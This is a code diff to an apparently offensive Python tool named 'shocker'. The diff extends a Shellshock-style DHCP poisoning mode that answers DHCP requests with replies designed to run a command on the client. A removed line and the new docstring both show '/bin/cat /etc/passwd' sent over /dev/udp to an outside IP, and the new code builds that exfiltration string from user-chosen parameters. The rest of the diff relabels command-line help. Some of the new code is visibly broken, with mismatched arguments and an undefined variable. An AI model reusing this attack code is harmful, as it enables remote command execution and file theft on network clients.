@@ -692,14 +692,14 @@ def print_progress(
 # DHCP Attacks
 #
 ###################
-def do_dhcp_attack(command):
+def do_dhcp_attack(command, IP, port):
     """ The main funtion for DHCP attacks. Accepts arguments passed in from the
     command line and outputs to the command line.
     """
     look_for_dhcp_servers()
     while True:
         print "[+] Waiting for DHCP requests..."
-        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp)
+        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp(command, IP, port))
 
 
 def look_for_dhcp_servers():
@@ -755,23 +755,24 @@ def look_for_dhcp_servers():
     else: print "[I] None found - shocker is DHCP authority"
 
 
-def process_dhcp(pkt):
-    if pkt.haslayer('DHCP'):
-        options = get_dhcp_options(pkt)
-        request_type = DHCP_REQUEST_TYPE[options['message-type']] 
-        requested_params = {}
-        print request_type 
-        print "DHCP options: %s" % str(options)
-        if options.has_key('param_req_list'):
-            requested_params = get_param_req_dict(options['param_req_list'])
-            print "Parameters requested: %s" % str(requested_params).strip('[]')
-        print "Command: %s" % str(pkt.command())
-        if request_type == "DHCPDISCOVER" or \
-                request_type == "DHCPREQUEST" or \
-                request_type == "DHCPINFORM":
-            print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
-            poison_dhcp_client(pkt, request_type, requested_params) 
-
+def process_dhcp(command, port):
+    def closed_process_dhcp(pkt):
+        if pkt.haslayer('DHCP'):
+            options = get_dhcp_options(pkt)
+            request_type = DHCP_REQUEST_TYPE[options['message-type']] 
+            requested_params = {}
+            print request_type 
+            print "DHCP options: %s" % str(options)
+            if options.has_key('param_req_list'):
+                requested_params = get_param_req_dict(options['param_req_list'])
+                print "Parameters requested: %s" % str(requested_params).strip('[]')
+            print "Command: %s" % str(pkt.command())
+            if request_type == "DHCPDISCOVER" or \
+                    request_type == "DHCPREQUEST" or \
+                    request_type == "DHCPINFORM":
+                print "[+] Recieved %s from %s/%s. Sending response..." % (request_type, pkt[Ether].src, pkt[IP].src)
+                poison_dhcp_client(pkt, request_type, requested_params, command, port) 
+        return closed_process_dhcp
 
 def get_dhcp_options(pkt):
     """Return a dictonary to DHCP options from the DHCP packet supplied
@@ -799,10 +800,22 @@ def get_param_req_dict(param_req_list):
     return parameter_dictionary
     
 
-def poison_dhcp_client(pkt, request_type, requested_params):
-    """Send poisoned response to the client
+def poison_dhcp_client(pkt, request_type, requested_params, command, port):
+    """Send poisoned response to the client.
+    <command> will be executed and if successful will be sent to udp <port> on the client 
+    A good example command is /bin/cat /etc/passwd which will result in an attack_string
+    of /bin/cat /etc/passwd>/dev/udp/[client's IP]/<port>
     """
-    command = "/bin/cat /etc/passwd>/dev/udp/57.57.57.57/5757"
+
+    # TODO IF authoritative set sensible values and to be returned and match with 
+    # current client IP address.
+    # Else set values appropriate to existing DHCP server and check that client IP
+    # address is sensible in relation to that (so that ponson reply can be routed by
+    # the victim machine
+    # Setup sniffer to capture and display responses
+
+    #IP = ****get my IP address****
+    attack_string = command + ">/dev/udp/" + IP + "/" + port
     print "DEBUG Here in poison" 
     if request_type == "DHCPDISCOVER":
         print "DEBUG: Sending DISCOVER response"
@@ -868,6 +881,7 @@ def poison_dhcp_client(pkt, request_type, requested_params):
         except Exception as e:
             print e
 
+
 def main():
     print """
    .-. .            .            
@@ -905,61 +919,62 @@ def main():
         '--Host',
         '-H',
         type = str,
-        help = 'A target hostname or IP address'
+        help = 'HTTP Mode - A target hostname or IP address'
         )
     targets.add_argument(
         '--file',
 	'-f',
         type = str,
-        help = 'File containing a list of targets'
+        help = 'HTTP Mode - File containing a list of targets'
         )
     cgis = parser.add_mutually_exclusive_group()
     cgis.add_argument(
         '--cgilist',
         type = str,
         default = './shocker-cgi_list',
-        help = 'File containing a list of CGIs to try'
+               
+        help = 'HTTP Mode - File containing a list of CGIs to try'
         )
     cgis.add_argument(
         '--cgi',
         '-c',
         type = str,
-        help = "Single CGI to check (e.g. /cgi-bin/test.cgi)"
+        help = "HTTP Mode - Single CGI to check (e.g. /cgi-bin/test.cgi)"
         )
     parser.add_argument(
         '--port',
         '-p',
         default = 80,
         type = int, 
-        help = 'The target port number (default=80)'
+        help = 'HTTP Mode - The target port number (default=80)'
         )
     parser.add_argument(
         '--command',
         default = "/bin/uname -a",
-        help = "Command to execute (default=/bin/uname -a)"
+        help = "HTTP & DHCP Modes - Command to execute (default=/bin/uname -a)"
         )
     parser.add_argument(
         '--proxy', 
-        help = "*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
+        help = "HTTP Mode - *A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
         )
     parser.add_argument(
         '--ssl',
         '-s',
         action = "store_true", 
         default = False,
-        help = "Use SSL (default=False)"
+        help = "HTTP Mode - Use SSL (default=False)"
         )
     parser.add_argument(
         '--header',
         default = "Content-type",
-        help = "Header to use (default=Content-type)"
+        help = "HTTP Mode - Header to use (default=Content-type)"
         )
     parser.add_argument(
         '--threads',
         '-t',
         type = int,
         default = 10,
-        help = "Maximum number of threads (default=10, max=100)"
+        help = "HTTP Mode - Maximum number of threads (default=10, max=100)"
         )
     parser.add_argument(
         '--verbose',
